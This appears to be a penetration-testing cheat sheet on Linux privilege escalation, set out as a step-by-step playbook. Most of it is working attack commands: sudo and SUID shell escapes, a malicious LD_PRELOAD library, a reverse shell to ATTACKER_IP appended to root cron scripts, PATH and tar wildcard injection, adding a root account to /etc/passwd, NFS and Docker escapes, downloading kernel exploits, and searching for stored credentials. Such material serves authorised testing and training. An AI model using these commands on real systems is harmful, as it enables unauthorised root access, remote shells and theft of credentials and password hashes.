# 🐧 Linux Privilege Escalation

> **Objective:** Escalate from low-privilege shell to root. Always enumerate first, then exploit.

---

## 📋 Methodology

```
1. Situational Awareness
   - whoami, id, hostname, uname -a
   - What user am I? What groups?

2. Automated Enumeration
   - LinPEAS, linEnum, lse.sh
   - Focus on RED/YELLOW findings

3. Manual Checks (in order of likelihood)
   - sudo -l (sudo permissions)
   - SUID/SGID binaries
   - Cron jobs
   - Writable files/scripts
   - Capabilities
   - Internal services (127.0.0.1)
   - Kernel exploits (last resort)

4. Exploit & Escalate
   - GTFOBins for SUID/sudo
   - Modify writable scripts
   - Exploit kernel CVE
```

---

## 🔍 Initial Enumeration

```bash
# Who am I?
whoami
id
groups

# System info
hostname
uname -a
cat /etc/os-release
cat /proc/version

# Other users
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/

# Network
ip a
ss -tulnp
netstat -tulnp

# Running processes
ps aux
ps aux | grep root

# Installed software
dpkg -l    # Debian
rpm -qa    # RedHat
```

---

## 🔑 Sudo Abuse

### Check Permissions
```bash
sudo -l
# Look for (ALL) NOPASSWD: entries
# Look for specific binaries you can run as root
```

### GTFOBins Exploitation
```bash
# If sudo allows a binary, check gtfobins.github.io

# Examples:
sudo vim -c ':!/bin/bash'
sudo find / -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/shadow   # then type !/bin/bash
sudo nmap --interactive  # then !sh (old versions)
sudo env /bin/bash
sudo perl -e 'exec "/bin/bash";'

# LD_PRELOAD (if env_keep+=LD_PRELOAD in sudo -l)
# 1. Create malicious shared library:
# evil.c: void _init() { setuid(0); system("/bin/bash"); }
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>
```

---

## 📁 SUID / SGID Binaries

### Find SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID
find / -perm -2000 -type f 2>/dev/null
```

### Exploit (check GTFOBins)
```bash
# Common exploitable SUID binaries:
# bash, dash, find, vim, nmap, python, perl, ruby, env, cp, mv

# Example: /usr/bin/find with SUID
find . -exec /bin/sh -p \;

# Example: /usr/bin/python3 with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Example: /usr/bin/bash with SUID
bash -p

# Example: /usr/bin/cp with SUID (overwrite /etc/passwd)
# Generate password: openssl passwd -1 newpass
# Add to /etc/passwd: root2:HASH:0:0::/root:/bin/bash
cp /tmp/passwd /etc/passwd
```

---

## ⏰ Cron Jobs

### Find Cron Jobs
```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Look for writable scripts run by root
find / -writable -type f 2>/dev/null | grep -v proc

# Monitor for running cron (if pspy available)
./pspy64
```

### Exploit Writable Cron Scripts
```bash
# If root runs /opt/backup.sh and you can write to it:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# Or add SUID to bash:
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Then: bash -p
```

### PATH Injection in Cron
```bash
# If crontab has: PATH=/home/user:/usr/local/sbin:...
# And script calls a command without full path (e.g., "tar")
# Create malicious version in /home/user/:
echo '#!/bin/bash' > /home/user/tar
echo 'chmod +s /bin/bash' >> /home/user/tar
chmod +x /home/user/tar
```

---

## 🎯 Capabilities

### Find Binaries with Capabilities
```bash
getcap -r / 2>/dev/null
```

### Exploit
```bash
# python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash")'

# tar with cap_dac_read_search (read any file)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz
```

---

## 🌐 NFS Shares

### Check for no_root_squash
```bash
# On target
cat /etc/exports
showmount -e target_ip

# Look for: /share *(rw,no_root_squash)
```

### Exploit
```bash
# On attacker (as root)
mkdir /tmp/nfs
mount -t nfs target_ip:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target
/share/bash -p    # root shell
```

---

## 🐳 Docker Escape

### Check if in Docker
```bash
ls /.dockerenv
cat /proc/1/cgroup | grep docker
hostname    # random hex = likely container
```

### Exploit (if user is in docker group)
```bash
# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or with existing image
docker run -v /:/host -it ubuntu bash
cat /host/etc/shadow
```

### Exploit (privileged container)
```bash
# If container runs with --privileged
mkdir /tmp/host
mount /dev/sda1 /tmp/host
cat /tmp/host/etc/shadow
chroot /tmp/host bash
```

---

## 🔧 Kernel Exploits (Last Resort)

### Identify Kernel Version
```bash
uname -r
uname -a
cat /proc/version
```

### Common Kernel Exploits
| CVE | Name | Kernel Version |
|-----|------|---------------|
| CVE-2016-5195 | Dirty COW | < 4.8.3 |
| CVE-2021-4034 | PwnKit (pkexec) | All polkit versions |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.11 |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 |
| CVE-2022-2588 | | 5.x |

### Exploit Workflow
```bash
# Search for exploits
searchsploit linux kernel <version>
# Or use linux-exploit-suggester:
./linux-exploit-suggester.sh

# Compile on attacker (same arch)
gcc exploit.c -o exploit

# Transfer to target
# Attacker: python3 -m http.server 80
wget http://ATTACKER/exploit
chmod +x exploit
./exploit
```

---

## 📝 Writable Files & Misconfigurations

### Writable /etc/passwd
```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 newpassword

# Add root user
echo 'hacker:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Writable /etc/shadow
```bash
# Generate hash
mkpasswd -m sha-512 newpassword

# Replace root hash
```

### Wildcard Injection (tar)
```bash
# If root runs: tar czf /tmp/backup.tar.gz *
# In the directory being backed up:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
```

---

## 🔗 Quick Reference: Enumeration Commands

```bash
# === MUST-RUN FIRST ===
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
getcap -r / 2>/dev/null

# === CREDENTIALS ===
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
cat ~/.bash_history
cat /var/log/auth.log 2>/dev/null
ls -la /home/*/.ssh/

# === INTERNAL SERVICES ===
ss -tulnp | grep 127.0.0.1
# Found internal service? Port forward to access it

# === WRITABLE PATHS ===
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## 🔗 Associated Tools
- [LinPEAS](../../TOOLS/LinPEAS.md) - Automated enumeration
- [John the Ripper](../../TOOLS/john_the_ripper.md) - Crack found hashes
- GTFOBins (https://gtfobins.github.io) - SUID/sudo exploitation
